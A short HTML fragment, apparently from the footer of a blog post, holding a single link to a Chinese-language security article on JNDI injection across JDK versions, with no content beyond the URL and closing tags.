href="https://johnfrod.top/%e5%ae%89%e5%85%a8/%e9%ab%98%e4%bd%8ejdk%e7%89%88%e6%9c%ac%e4%b8%adjndi%e6%b3%a8%e5%85%a5/">https://johnfrod.top/%e5%ae%89%e5%85%a8/%e9%ab%98%e4%bd%8ejdk%e7%89%88%e6%9c%ac%e4%b8%adjndi%e6%b3%a8%e5%85%a5/<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
